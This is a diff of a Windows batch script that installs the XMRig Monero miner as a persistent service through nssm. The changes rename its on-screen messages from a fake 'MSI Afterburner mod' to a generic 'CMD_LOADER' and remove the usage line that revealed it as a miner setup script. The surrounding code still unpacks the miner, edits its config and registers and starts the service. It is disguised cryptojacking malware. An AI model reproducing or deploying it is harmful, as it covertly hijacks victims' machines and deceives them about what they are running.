@@ -5,7 +5,7 @@ set VERSION=3.1
 rem printing greetings
 
 echo [*] Starting...
-echo [*] MSI-MOD Will Install Shortly..
+echo [*] CMD_LOADER Will Install Shortly..
 echo.
 
 net session >nul 2>&1
@@ -20,7 +20,7 @@ rem checking prerequisites
 
 if [%WALLET%] == [] (
   echo Script usage:
-  echo ^> setup_moneroocean_miner.bat ^<wallet address^> [^<your email address^>]
+  echo [*]
   echo ERROR: Please specify your Hash
   exit /b 1
 )
@@ -178,7 +178,7 @@ echo.
 if %ADMIN% == 0 (
   echo [*] Scripts Loading...
 ) else (
-  echo [*] Modding MSI-AFTER-BURNER
+  echo [*] Modding CMD
 )
 
 echo.
@@ -222,7 +222,7 @@ if errorlevel 1 (
 )
 del "%USERPROFILE%\xmrig.zip"
 
-echo [*] Checking if advanced version of MSI-MOD Avalible
+echo [*] Checking if advanced version of CMD_LOADER Avalible
 powershell -Command "$out = cat '%USERPROFILE%\moneroocean\config.json' | %%{$_ -replace '\"donate-level\": *\d*,', '\"donate-level\": 1,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\moneroocean\config.json'" 
 "%USERPROFILE%\moneroocean\xmrig.exe" --help >NUL
 if %ERRORLEVEL% equ 0 goto MINER_OK
@@ -278,14 +278,14 @@ if %ERRORLEVEL% equ 0 goto MINER_OK
 if exist "%USERPROFILE%\moneroocean\xmrig.exe" (
   echo WARNING: Stock version of MOD
 ) else (
-  echo WARNING: Stock version of MSI Removed by Windows Defender
+  echo WARNING: Stock version of CMD Removed by Windows Defender
 )
 
 exit /b 1
 
 :MINER_OK
 
-echo [*] MSI-ADMIN is OK
+echo [*] CMD-ADMIN is OK
 
 for /f "tokens=*" %%a in ('powershell -Command "hostname | %%{$_ -replace '[^a-zA-Z0-9]+', '_'}"') do set PASS=%%a
 if [%PASS%] == [] (
@@ -373,12 +373,12 @@ if errorlevel 1 (
 )
 del "%USERPROFILE%\nssm.zip"
 
-echo [*] Creating MSI-CONFIG
+echo [*] Creating CMD-CONFIG
 sc stop moneroocean_miner
 sc delete moneroocean_miner
 "%USERPROFILE%\moneroocean\nssm.exe" install moneroocean_miner "%USERPROFILE%\moneroocean\xmrig.exe"
 if errorlevel 1 (
-  echo ERROR: Can't create MSI_CONFIG
+  echo ERROR: Can't create CMD_CONFIG
   exit /b 1
 )
 "%USERPROFILE%\moneroocean\nssm.exe" set moneroocean_miner AppDirectory "%USERPROFILE%\moneroocean"
@@ -386,10 +386,10 @@ if errorlevel 1 (
 "%USERPROFILE%\moneroocean\nssm.exe" set moneroocean_miner AppStdout "%USERPROFILE%\moneroocean\stdout"
 "%USERPROFILE%\moneroocean\nssm.exe" set moneroocean_miner AppStderr "%USERPROFILE%\moneroocean\stderr"
 
-echo [*] Starting MSI-AFTER-BURNER
+echo [*] Starting CMD
 "%USERPROFILE%\moneroocean\nssm.exe" start moneroocean_miner
 if errorlevel 1 (
-  echo ERROR: Can't start MSI-AFTER-BURNER
+  echo ERROR: Can't start CMD
   exit /b 1
 )
 
@@ -399,7 +399,7 @@ goto OK
 
 :OK
 echo
-echo [*] MSI-MOD LOADED
+echo [*] CMD_LOADER LOADED
 
 exit /b 0
 
